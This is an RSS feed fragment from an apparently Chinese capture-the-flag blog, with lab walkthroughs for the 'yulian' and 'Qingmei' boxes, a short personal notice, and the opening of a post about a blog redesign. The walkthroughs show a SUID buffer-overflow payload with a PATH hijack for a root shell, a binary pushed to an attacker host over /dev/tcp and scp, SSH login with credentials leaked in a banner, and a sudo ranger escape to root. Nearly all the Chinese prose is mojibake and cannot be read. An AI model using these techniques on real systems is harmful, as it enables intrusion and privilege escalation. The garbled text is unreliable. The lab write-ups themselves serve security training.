|3,0,2,1,1,0,1750913920,'history '
'3      LINE    0

|3,0,3,1,1,0,1750913920,''
'4      LINE    0
            int flag = 0;
|3,0,4,1,1,0,1750786253,'    int flag = 0;'

# File marks:
'0  1  0  ~/.ash_history
|4,48,1,0,1750913922,'~/.ash_history'
'1  13  12  /opt/vuln.c
|4,49,13,12,1750786392,'/opt/vuln.c'
'2  30  0  /opt/vuln.c
|4,50,30,0,1750786258,'/opt/vuln.c'
'3  30  0  /opt/vuln.c
|4,51,30,0,1750786258,'/opt/vuln.c'
'4  43  0  /etc/ssh/sshd_config
|4,52,43,0,1750769292,'/etc/ssh/sshd_config'

# Jumplist (newest first):
-'  1  0  ~/.ash_history
|4,39,1,0,1750913922,'~/.ash_history'
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,'/opt/vuln.c'
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'

# History of marks within files (newest to oldest):

&gt; ~/.ash_history
        *       1750913922      0
        '       1       0
        .       1       0
        +       1       0

&gt; /opt/vuln.c
        *       1750786390      0
        '       13      12
        ^       13      13
        .       13      12
        +       11      0
        +       13      12

&gt; /etc/ssh/sshd_config
        *       1750769290      0
        '       43      0
        ^       43      0
        .       41      0
        +       41      0
localhost:~$ cd .ssh/
localhost:~/.ssh$ ls -al
total 28
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 ..
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:51 authorized_keys
-rw-------    1 ldz      ldz            399 Jun 24 20:43 id_ed25519
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:43 id_ed25519.pub
-rw-------    1 ldz      ldz            828 Jun 25 13:18 known_hosts
-rw-r--r--    1 ldz      ldz             92 Jun 25 13:18 known_hosts.old
localhost:~/.ssh$ ssh-keygen -l -f id_ed25519
256 SHA256:N14sJc5eu0fTD2oG9XrFil1dcsAbsSw3JjqW6vmwheg ldz@localhost (ED25519)
```

### 5.3 SUIDÊèêÊùÉ‰∏éPATHÂä´ÊåÅ

Êâæ‰∏çÂà∞ÔºåÁúãÂà∞vimÁöÑÂéÜÂè≤ËÆ∞ÂΩïÊúâ‰øÆÊîπËøá/opt/vulnÂéªÁúãÁúã

```
localhost:~/.ssh$ cd /opt/
localhost:/opt$ ls -al
total 40
drwxr-xr-x    5 root     root          4096 Jun 25 01:42 .
drwxr-xr-x   21 root     root          4096 Jun 25 01:45 ..
drwx--x--x    4 root     root          4096 Jun 16 16:03 containerd
drw-------    2 root     root          4096 Jun 24 19:55 server
drw-------    3 root     root          4096 Jun 25 01:52 server2
-rwsr-xr-x    1 root     root         19968 Jun 25 01:33 vuln
localhost:/opt$ ./vuln 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag = 0
password wrong
```

ÊúâÁÇπÂÉèÊ∫¢Âá∫ÔºåÊãñËøáÊù•ÁúãÁúã
ËÄÅÊ†∑Â≠êÔºåkaliÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nc -lvnp 1234 &gt; vuln     
listening on [any] 1234 ...

```

Èù∂Êú∫Êé®ÈÄÅ

```
localhost:/opt$ cat vuln &gt; /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
localhost:/opt$ which bash
```

okÔºåÈÇ£Ê≤°‰∫ã‰∫ÜÔºåÊãøscpÊé®

```
localhost:/opt$ scp vuln kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
The authenticity of host '192.168.205.128 (192.168.205.128)' can't be established.
ED25519 key fingerprint is SHA256:0EmnEbFZ1K2Otrqlk0b3OHH8M36kr43dnKXNZ9+mcLI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '192.168.205.128' (ED25519) to the list of known hosts.
kali@192.168.205.128's password: 
vuln                                                                                                                                            100%   20KB   8.9MB/s   00:00   
```

ÊãñÂéªida

```
void __cdecl vuln()
{
  char buffer[32]; // [rsp+0h] [rbp-30h] BYREF
  ssize_t n; // [rsp+20h] [rbp-10h]
  int flag; // [rsp+2Ch] [rbp-4h]

  flag = 0;
  n = read(0, buffer, 0x30uLL);
  if ( flag == 1 )
  {
    secret();
  }
  else
  {
    printf('flag = %d\n', (unsigned int)flag);
    puts('password wrong');
  }
}

void __cdecl secret()
{
  setuid(0);
  system('cat /etc/shadow');
}
```

ÁúãÊù•‰∏Ä‰∏ãÔºåÁ°ÆÂÆûÊòØÊ∫¢Âá∫
‰Ω†ÊÉ≥Êãøshell‰πüÂèØ‰ª•ÔºåÁé©Ê≥ïÊå∫Â§ö

```
localhost:/opt$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
localhost:/opt$ tty
/dev/pts/0
localhost:/opt$ cd /home/ldz
localhost:~$ echo '/bin/sh &lt; /dev/pts/0' &gt; cat
localhost:~$ chmod +x cat
localhost:~$ (printf 'A%.0s' $(seq 1 44); printf '\x01\x00\x00\x00') &gt; p
localhost:~$ xxd p
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 0100 0000  AAAAAAAAAAAA....
localhost:~$ export PATH=/home/ldz:$PATH
localhost:~$ cd /opt
localhost:/opt$ ./vuln &lt; /home/ldz/p
/opt # id
uid=0(root) gid=1000(ldz) groups=1000(ldz)
/opt # export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$HOME/bin
/opt # cat /root/root.txt 
flag{98ecb90d5dcef41e1bd18f47697f287a}
```

ËØÑ‰ª∑‰∏Ä‰∏ãËøô‰∏™Èù∂Êú∫
![image-20250628094814909](https://7r1umphk.github.io/image/image20250628094815151.webp)

ÂìàÂìàÔºåÊ≤°ÊâìËøáÁöÑÂèØ‰ª•ÊúüÂæÖ‰∏ÄÊâãsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_yulian.html</guid><pubDate>Sat, 28 Jun 2025 02:20:14 +0000</pubDate></item><item><title>ËØ¥ÁÇπ‰∫ã</title><link>https://7r1UMPHK.github.io/post/shuo-dian-shi.html</link><description>‰∫ãÊÉÖÁªèËøáÂ∞±ÊòØÊàëÁîµËÑëÊúâÈóÆÈ¢òÂà∑‰∫ÜÁ≥ªÁªüÔºåÁÑ∂ÂêéÊàëgithubÂíågoogleÈÉΩÂºÄ‰∫Ü‰∫åÊ≠•ÔºåÂÖ®ÈÉ®Ê≤°‰∫ÜÔºåso
7r1umphÊòØÊàëÔºå7r1umphk‰πüÊòØÊàë
‰ª•ÂêéÂèëÂ∏ÉÂ∞±ÂèëÂú®Ëøô‰∫ÜÔºåÁÑ∂ÂêéhmvÂíåthlÂπ≥Âè∞Â∫îËØ•‰ºöÂàõ‰∏Ä‰∏™Êñ∞Âè∑ÂêçÂ≠óÊòØ7r1umphk
ÂΩìÁÑ∂Â¶ÇÊûúÊóßÂçöÂÆ¢ÊúâÁöÑwpÊàë‰∏ç‰ºö‰∫§‰∫Ü
Â∞±ËØ¥Ëøô‰πàÂ§ösentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shuo-dian-shi.html</guid><pubDate>Fri, 27 Jun 2025 09:34:16 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Qingmei</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Qingmei.html</link><description>## 1. ‰ø°ÊÅØÊî∂ÈõÜ

### 1.1 ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑ÂØπÊú¨Âú∞ÁΩëÁªú `192.168.205.0/24` ËøõË°åÊâ´ÊèèÔºå‰ª•ËØÜÂà´ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan )
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.218 08:00:27:83:ca:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.974 seconds (129.69 hosts/sec). 4 responded
```

**ÁªìÊûúÔºö** ÁõÆÊ†á‰∏ªÊú∫ IP Âú∞ÂùÄÁ°ÆËÆ§‰∏∫ `192.168.205.218`„ÄÇ

### 1.2 Á´ØÂè£Êâ´Êèè‰∏éÊúçÂä°ËØÜÂà´

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ `192.168.205.218` ËøõË°åÂÖ®Á´ØÂè£ TCP Êâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p- --min-rate 10000 192.168.205.218
Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-18 22:55 EDT
Nmap scan report for 192.168.205.218
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

Ëøõ‰∏ÄÊ≠•ÂØπÂºÄÊîæÁ´ØÂè£ËøõË°åÊúçÂä°ÁâàÊú¨Êé¢ÊµãÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p22,80 -sV 192.168.205.218
Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-19 08:30 EDT
Nmap scan report for 192.168.205.218
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/  .
Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
```

**ÁªìÊûúÔºö** ÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü SSH ÊúçÂä° (OpenSSH 8.9p1, Á´ØÂè£ 22) Âíå HTTP ÊúçÂä° (Apache httpd 2.4.62, Á´ØÂè£ 80)„ÄÇ

## 2. ÊºèÊ¥ûÂàÜÊûê‰∏éÂà©Áî®

### 2.1 Web ÊúçÂä°Êé¢Êµã

ÂØπÁõÆÊ†á 80 Á´ØÂè£ÁöÑ HTTP ÊúçÂä°ËøõË°åÂàùÊ≠•Êé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -v http://192.168.205.218
*   Trying 192.168.205.218:80...
* Connected to 192.168.205.218 (192.168.205.218) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.218
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt;
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Mon, 19 May 2025 03:11:15 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sun, 18 May 2025 13:52:35 GMT
&lt; ETag: '64d-6356953de9708'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 1613
&lt; Vary: Accept-Encoding
&lt; Content-Type: text/html
&lt;
&lt;h1&gt;
&lt;pre&gt;
                                   .     **
                                 *           *.
                                               ,*
                                                  *,
                          ,                         ,*
                       .,                              *,
                     /                                    *
                  ,*                                        *,
                /.                                            .*.
              *                                                  **
              ,*                                               ,*
                 **                                          *.
                    **                                    **.
                      ,*                                **
                         *,                          ,*
                            *                      **
                              *,                .*
                                 *.           **
                                   **      ,*,
                                      ** *,     HackMyVM

   QQ Group:   660930334
   &lt;/h1&gt;
&lt;/pre&gt;
* Connection
```

Web È¶ñÈ°µÂÜÖÂÆπ‰∏∫Â≠óÁ¨¶ÁîªÂèä QQ Áæ§Âè∑ÔºåÊú™ÂèëÁé∞Áõ¥Êé•ÂèØÂà©Áî®‰ø°ÊÅØ„ÄÇ

‰ΩøÁî® `dirb` ËøõË°åÁõÆÂΩïÁàÜÁ†¥Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ dirb http://192.168.205.218

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun May 18 23:13:00 2025
URL_BASE: http://192.168.205.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.205.218/ ----
+ http://192.168.205.218/index.html (CODE:200|SIZE:1613)
+ http://192.168.205.218/server-status (CODE:403|SIZE:280)

-----------------
END_TIME: Sun May 18 23:13:03 2025
DOWNLOADED: 4612 - FOUND: 2
```

**ÁªìÊûúÔºö** ÁõÆÂΩïÁàÜÁ†¥‰ªÖÂèëÁé∞ `index.html` ÂíåË¢´Á¶ÅÊ≠¢ËÆøÈóÆÁöÑ `server-status`„ÄÇWeb ÊúçÂä°ÊñπÈù¢Êú™ÊâæÂà∞ÊòéÊòæÁ™ÅÁ†¥Âè£„ÄÇ

### 2.2 SSH ÊúçÂä°Êé¢Êµã‰∏éÂàùÂßãËÆøÈóÆ

Â∞ùËØïËøûÊé• SSH ÊúçÂä°ÔºåËßÇÂØüÂÖ∂ Banner ‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh root@192.168.205.218
 ____________
( guest/guest )
 -------------
        o   ^__^
         o  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
root@192.168.205.218's password:
```

**ÂèëÁé∞Ôºö** SSH Banner Ê≥ÑÈú≤‰∫ÜÂá≠ÊçÆ `guest/guest`„ÄÇ

‰ΩøÁî®Ê≥ÑÈú≤ÁöÑÂá≠ÊçÆ `guest:guest` ÁôªÂΩï SSHÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh guest@192.168.205.218
Password: guest
# ÊàêÂäüÁôªÂΩï
guest@Qingmei:~$ id
uid=1000(guest) gid=1000(guest) groups=1000(guest)
```

**ÁªìÊûúÔºö** ÊàêÂäü‰ª• `guest` Áî®Êà∑Ë∫´‰ªΩËé∑ÂæóÂØπÁ≥ªÁªüÁöÑÂàùÂßãËÆøÈóÆÊùÉÈôê„ÄÇ

## 3. ÊùÉÈôêÊèêÂçá

### 3.1 ÊùÉÈôêÊèêÂçáÔºöguest -&gt; morri

ÁôªÂΩïÂêéÔºåÂØπ `guest` Áî®Êà∑ËøõË°åÊú¨Âú∞Êûö‰∏æ„ÄÇ

#### 3.1.1 ÂÆ∂ÁõÆÂΩïÊ£ÄÊü•‰∏é sudo ÊùÉÈôê

Êü•Áúã `guest` Áî®Êà∑ÂÆ∂ÁõÆÂΩïÂÜÖÂÆπÂèä `sudo` ÊùÉÈôêÔºö

```bash
guest@Qingmei:~$ ls -la
total 28
drwxr-xr-x 2 guest guest 4096 May 18 22:57 .
drwxr-xr-x 4 root  root  4096 May 18 09:55 ..
-rw-r--r-- 1 root  root   166 May 18 09:55 banner
-rw-r--r-- 1 guest guest  220 May 18 09:54 .bash_logout
-rw-r--r-- 1 guest guest 3543 May 18 09:55 .bashrc
-rw------- 1 guest guest   31 May 18 22:32 .lesshst
-rw-r--r-- 1 guest guest  807 May 18 09:54 .profile

guest@Qingmei:~$ cat banner
 ____________
&lt; Are u ok ? &gt;
 -------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

guest@Qingmei:~$ sudo -l
[sudo] password for guest: guest
Sorry, user guest may not run sudo on Qingmei.
```

**ÁªìÊûúÔºö** `guest` Áî®Êà∑Êó† `sudo` ÊùÉÈôê„ÄÇÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `banner` Êñá‰ª∂ÂÜÖÂÆπÂ¶Ç‰∏ä„ÄÇ

#### 3.1.2 SUID Êñá‰ª∂Ê£ÄÊü•

```bash
guest@Qingmei:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

**ÁªìÊûúÔºö** Êú™ÂèëÁé∞ÈùûÊ†áÂáÜÁöÑ SUID ÂèØÊâßË°åÊñá‰ª∂„ÄÇ

#### 3.1.3 Ê£ÄÊü• `/opt` ÁõÆÂΩï

```bash
guest@Qingmei:~$ cd /opt/
guest@Qingmei:/opt$ ls -al
total 32
drwxr-xr-x  2 root root  4096 May 18 10:12 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rw-r--r--  1 root root   169 May 18 09:53 banner.txt
-rwx-----x  1 root root 17024 May 18 10:12 morri_password
```

**ÂèëÁé∞Ôºö** Âú® `/opt` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `morri_password` ÁöÑÂèØÊâßË°åÊñá‰ª∂ÔºåÂÖ∂ÊâÄÊúâËÄÖ‰∏∫ `root`Ôºå‰ΩÜ `guest` Áî®Êà∑ÔºàÂ±û‰∫é `others`ÔºâÂÖ∑ÊúâÊâßË°åÊùÉÈôê„ÄÇ

Â∞ùËØïÊâßË°åËØ•Á®ãÂ∫èÂπ∂Êü•ÁúãÂ∏ÆÂä©‰ø°ÊÅØÔºö

```bash
guest@Qingmei:/opt$ ./morri_password
You need to input strings of 'A's with correct lengths (10-50 characters).
You'll be asked to do this 10 times.

Try 1/10: Please input exactly 26 'A's: ^C

guest@Qingmei:/opt$ ./morri_password -h
Usage: ./program [options]
Options:
  -h          Show this help message
  --dashazi   Directly output credentials

Normal operation:
  The program will ask you to input strings of 'A's with random lengths (10-50)
  You need to correctly input 10 times to get the credentials
```

**ÂèëÁé∞Ôºö** Á®ãÂ∫èÂ≠òÂú® `--dashazi` ÈÄâÈ°πÂèØ‰ª•Áõ¥Êé•ËæìÂá∫Âá≠ÊçÆ„ÄÇ

#### 3.1.4 Ëé∑Âèñ `morri` Áî®Êà∑Âá≠ÊçÆ

‰ΩøÁî® `--dashazi` ÈÄâÈ°πÊâßË°åÁ®ãÂ∫èÔºö

```bash
guest@Qingmei:/opt$ ./morri_password --dashazi
user:morri pass:morri
```

**ÁªìÊûúÔºö** ÊàêÂäüËé∑ÂèñÁî®Êà∑ `morri` ÁöÑÂá≠ÊçÆ‰∏∫ `morri:morri`„ÄÇ

#### 3.1.5 ÂàáÊç¢Ëá≥ `morri` Áî®Êà∑Âπ∂Ëé∑Âèñ `user.txt`

```bash
guest@Qingmei:/opt$ su morri
Password: morri # ËæìÂÖ•ÂØÜÁ†Å morri
morri@Qingmei:/opt$ id
uid=1001(morri) gid=1001(morri) groups=1001(morri)
morri@Qingmei:/opt$ cd ~
morri@Qingmei:~$ cat user.txt
flag{user-edf050af-33ef-11f0-b3f0-000c2955ba04}
```

**ÁªìÊûúÔºö** ÊàêÂäüÂàáÊç¢Âà∞ `morri` Áî®Êà∑Âπ∂ËØªÂèñ `user.txt`ÔºåËé∑ÂèñÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

### 3.2 ÊùÉÈôêÊèêÂçáÔºömorri -&gt; root

#### 3.2.1 Sudo ÊùÉÈôêÊ£ÄÊü• (morri)

Ê£ÄÊü• `morri` Áî®Êà∑ÁöÑ `sudo` ÊùÉÈôêÔºö

```bash
morri@Qingmei:~$ sudo -l
Matching Defaults entries for morri on Qingmei:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User morri may run the following commands on Qingmei:
    (ALL) NOPASSWD: /usr/bin/ranger
```

**ÂèëÁé∞Ôºö** `morri` Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª• `root` ÊùÉÈôêÊâßË°å `/usr/bin/ranger`„ÄÇ

#### 3.2.2 Âà©Áî® `ranger` ÊèêÊùÉ

`ranger` ÊòØ‰∏Ä‰∏™ÁªàÁ´ØÊñá‰ª∂ÁÆ°ÁêÜÂô®ÔºåÂèØ‰ª•ÈÄöËøáÂÖ∂ÂÜÖÁΩÆÁöÑ shell ÊâßË°åÂäüËÉΩÊù•Ëé∑Âèñ `root` shell„ÄÇ

1. ÊâßË°å `sudo /usr/bin/ranger`„ÄÇ

   ```bash
   morri@Qingmei:~$ sudo /usr/bin/ranger
   ```

2. Âú® `ranger` ÁïåÈù¢‰∏≠ÔºåÊåâ‰∏ã `s` ÈîÆ (Êàñ `:`) ËøõÂÖ•ÂëΩ‰ª§Ê®°Âºè„ÄÇ

3. ËæìÂÖ• `bash -p` (Êàñ `sh -p`) Âπ∂ÂõûËΩ¶„ÄÇÂèÇÊï∞ `-p` Á°Æ‰øù `bash` ‰ª•ÁâπÊùÉÊ®°ÂºèÔºàeffective UID as rootÔºâÂêØÂä®„ÄÇ

ÊâßË°åÂêéÔºåÊàêÂäüËøîÂõû‰∏Ä‰∏™ `root` shell„ÄÇ

```bash
# Ê≠§Â§ÑÂ∑≤ÊòØ root shell
root@Qingmei:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Qingmei:~# cat /root/root.txt
flag{root-485ee7a8-33f0-11f0-afbc-000c2955ba04}
```

**ÁªìÊûúÔºö** ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÂπ∂ËØªÂèñ `root.txt`ÔºåËé∑ÂèñÁ¨¨‰∫å‰∏™ flag„ÄÇ

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Qingmei.html</guid><pubDate>Fri, 27 Jun 2025 09:34:11 +0000</pubDate></item><item><title>‚ú® ÁÑïÁÑ∂‰∏ÄÊñ∞ÔºöÊàëÁöÑÂçöÂÆ¢ÁïåÈù¢ÁæéÂåñ‰πãÊóÖ ‚ú®</title><link>https://7r1UMPHK.github.io/post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html</link><description>Â§ßÂÆ∂Â•ΩÔºÅ

ÊúÄËøëÂ¶ÇÊûú‰Ω†ÁªèÂ∏∏ËÆøÈóÆÊàëÁöÑÂçöÂÆ¢ÔºåÂèØËÉΩ‰ºöÂèëÁé∞ÂÆÉÊÇÑÊÇÑÂú∞‚ÄúÂèòËÑ∏‚Äù‰∫ÜÔºÅÊ≤°ÈîôÔºåÂú®ËøáÂéªÁöÑ‰∏ÄÊÆµÊó∂Èó¥ÈáåÔºåÊàëÊäïÂÖ•‰∫Ü‰∏çÂ∞ëÁ≤æÂäõÂØπÂçöÂÆ¢ÁöÑÂâçÁ´ØÁïåÈù¢ËøõË°å‰∫Ü‰∏ÄÊ¨°ÊØîËæÉÂÖ®Èù¢ÁöÑÁæéÂåñÂíåÂçáÁ∫ß„ÄÇÁõÆÁöÑÂæàÁÆÄÂçïÔºö**ÊèêÂçáÈòÖËØª‰ΩìÈ™åÔºåËÆ©ÂÆÉÁúãËµ∑Êù•Êõ¥Áé∞‰ª£„ÄÅÊõ¥ËàíÊúçÔºÅ**

ËøôÊ¨°‚ÄúÁæéÂÆπÊâãÊúØ‚Äù‰∏ªË¶ÅÂåÖÂê´‰ª•‰∏ãÂá†‰∏™ÊñπÈù¢Ôºö

### 1. ÁßªÂä®Á´Ø‰ΩìÈ™åÂ§ß‰ºòÂåñ üì±

ÊàëÁü•ÈÅìÂæàÂ§öÊúãÂèã‰π†ÊÉØÁî®ÊâãÊú∫ÊµèËßàÔºåÊâÄ‰ª•ÁßªÂä®Á´ØÁöÑ‰ºòÂåñÊòØÈáç‰∏≠‰πãÈáçÔºö

*   **ÂëäÂà´Èîô‰Ωç**Ôºö‰øÆÂ§ç‰∫Ü‰πãÂâçÊâãÊú∫Á´ØÈ¶ñÈ°µÂ§¥ÂÉèÊúâÊó∂‰ºö‚Äú‰π±Ë∑ë‚ÄùÁöÑÈóÆÈ¢ò„ÄÇ
*   **ÂØºËà™Âä©Êâã**Ôºö‰∏∫ÊñáÁ´†È°µÈù¢Ê∑ªÂä†‰∫Ü**ÊµÆÂä®ÁõÆÂΩïÊåâÈíÆ**Âíå**ÂõûÂà∞È°∂ÈÉ®ÊåâÈíÆ**„ÄÇÁé∞Âú®ÔºåÂç≥‰ΩøÊòØÈïøÁØáÂ§ßËÆ∫Ôºå‰πüËÉΩËΩªÊùæÂÆö‰ΩçÂíåËøîÂõûÈ°∂ÈÉ®Âï¶ÔºÅ
*   **Â∏ÉÂ±ÄÈÄÇÈÖç**ÔºöÊï¥‰ΩìË∞ÉÊï¥‰∫ÜËæπË∑ù„ÄÅÂç°ÁâáÊ†∑ÂºèÂíåÂ≠ó‰ΩìÂ§ßÂ∞èÔºå‰ΩøÂÖ∂Âú®Â∞èÂ±èÂπï‰∏äÊòæÁ§∫Êõ¥Âä†ÂíåË∞ê„ÄÇ

### 2. ËßÜËßâÈ£éÊ†ºÂÖ®Èù¢Èù©Êñ∞ üé®

